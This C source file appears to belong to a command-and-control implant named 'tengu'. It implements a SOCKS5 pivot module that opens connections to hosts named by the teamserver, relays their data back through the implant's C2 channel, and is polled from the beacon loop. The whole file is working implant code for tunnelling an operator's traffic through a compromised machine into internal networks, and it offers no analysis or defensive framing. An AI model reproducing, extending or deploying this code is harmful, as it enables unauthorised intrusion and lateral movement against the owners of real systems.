#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netdb.h>
#include <fcntl.h>
#include <stdint.h>

#include "tengu.h"

#define MAX_SOCKS5_CONNS 16
#define SOCKS5_BUF       65536

typedef struct {
    uint32_t id;
    int      fd;
} Socks5Conn;

static Socks5Conn g_socks5[MAX_SOCKS5_CONNS];

void socks5_init(void) {
    for (int i = 0; i < MAX_SOCKS5_CONNS; i++)
        g_socks5[i].fd = -1;
}

static Socks5Conn* socks5_find(uint32_t id) {
    for (int i = 0; i < MAX_SOCKS5_CONNS; i++)
        if (g_socks5[i].fd >= 0 && g_socks5[i].id == id)
            return &g_socks5[i];
    return NULL;
}

static Socks5Conn* socks5_alloc(uint32_t id) {
    for (int i = 0; i < MAX_SOCKS5_CONNS; i++) {
        if (g_socks5[i].fd < 0) {
            g_socks5[i].id = id;
            return &g_socks5[i];
        }
    }
    return NULL;
}

static void socks5_free(Socks5Conn* c) {
    if (c->fd >= 0) { close(c->fd); c->fd = -1; }
}

// Builds and sends a SOCKS5_DATA or SOCKS5_CLOSE frame to the teamserver.
// For SOCKS5_DATA: data!=NULL, dlen>0 (or 0 to signal connection open).
// For SOCKS5_CLOSE: data==NULL, dlen==0, cmd=TENGU_SOCKS5_CLOSE.
static void socks5_send_frame(uint32_t cmd, uint32_t conn_id, const uint8_t* data, size_t dlen) {
    // Body: [cmd:4BE][req_id=0:4BE][data_size:4BE][conn_id:4LE][data]
    uint32_t payload_size = 4 + (uint32_t)dlen;

    Buf* body = buf_new();
    buf_push_u32be(body, cmd);
    buf_push_u32be(body, 0);                          // req_id = 0 (async)
    buf_push_u32be(body, payload_size);
    buf_push_u32le(body, conn_id);
    if (data && dlen > 0)
        buf_push_bytes(body, data, dlen);

    // Prepend 12-byte BE header: [total_size][magic][agent_id]
    Buf* pkt = buf_new();
    buf_push_u32be(pkt, 12 + (uint32_t)body->size);
    buf_push_u32be(pkt, TENGU_MAGIC_VALUE);
    buf_push_u32be(pkt, g_agent_id);
    buf_push_bytes(pkt, body->data, body->size);
    buf_free(body);

    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

void socks5_open(uint32_t conn_id, const char* host, uint16_t port) {
    struct addrinfo hints = {0};
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%u", (unsigned)port);

    struct addrinfo* res = NULL;
    if (getaddrinfo(host, port_str, &hints, &res) != 0 || !res) {
        socks5_send_frame(TENGU_SOCKS5_CLOSE, conn_id, NULL, 0);
        return;
    }

    int fd = socket(res->ai_family, SOCK_STREAM, 0);
    if (fd < 0) {
        freeaddrinfo(res);
        socks5_send_frame(TENGU_SOCKS5_CLOSE, conn_id, NULL, 0);
        return;
    }

    if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) {
        close(fd);
        freeaddrinfo(res);
        socks5_send_frame(TENGU_SOCKS5_CLOSE, conn_id, NULL, 0);
        return;
    }
    freeaddrinfo(res);

    // Set non-blocking for future reads in socks5_collect_data.
    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);

    Socks5Conn* conn = socks5_alloc(conn_id);
    if (!conn) {
        close(fd);
        socks5_send_frame(TENGU_SOCKS5_CLOSE, conn_id, NULL, 0);
        return;
    }
    conn->fd = fd;

    // Signal success with empty SOCKS5_DATA frame.
    socks5_send_frame(TENGU_SOCKS5_DATA, conn_id, NULL, 0);
}

void socks5_send_data(uint32_t conn_id, const uint8_t* data, size_t dlen) {
    Socks5Conn* conn = socks5_find(conn_id);
    if (!conn || dlen == 0) return;

    size_t total = 0;
    while (total < dlen) {
        ssize_t n = write(conn->fd, data + total, dlen - total);
        if (n <= 0) {
            socks5_send_frame(TENGU_SOCKS5_CLOSE, conn_id, NULL, 0);
            socks5_free(conn);
            return;
        }
        total += n;
    }
}

void socks5_close(uint32_t conn_id) {
    Socks5Conn* conn = socks5_find(conn_id);
    if (conn) socks5_free(conn);
}

// Check all active SOCKS5 sockets for incoming data and send it to the server.
// Called from the main beacon loop when SOCKS5 connections are active.
void socks5_collect_data(void) {
    static uint8_t buf[SOCKS5_BUF];

    fd_set rfds;
    FD_ZERO(&rfds);
    int maxfd = -1;

    for (int i = 0; i < MAX_SOCKS5_CONNS; i++) {
        if (g_socks5[i].fd >= 0) {
            FD_SET(g_socks5[i].fd, &rfds);
            if (g_socks5[i].fd > maxfd) maxfd = g_socks5[i].fd;
        }
    }
    if (maxfd < 0) return;

    struct timeval tv = {0, 0};   // non-blocking poll
    int ready = select(maxfd + 1, &rfds, NULL, NULL, &tv);
    if (ready <= 0) return;

    for (int i = 0; i < MAX_SOCKS5_CONNS; i++) {
        if (g_socks5[i].fd < 0) continue;
        if (!FD_ISSET(g_socks5[i].fd, &rfds)) continue;

        ssize_t n = read(g_socks5[i].fd, buf, sizeof(buf));
        if (n > 0) {
            socks5_send_frame(TENGU_SOCKS5_DATA, g_socks5[i].id, buf, (size_t)n);
        } else if (n == 0 || (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK)) {
            socks5_send_frame(TENGU_SOCKS5_CLOSE, g_socks5[i].id, NULL, 0);
            socks5_free(&g_socks5[i]);
        }
    }
}

int socks5_active(void) {
    for (int i = 0; i < MAX_SOCKS5_CONNS; i++)
        if (g_socks5[i].fd >= 0) return 1;
    return 0;
}
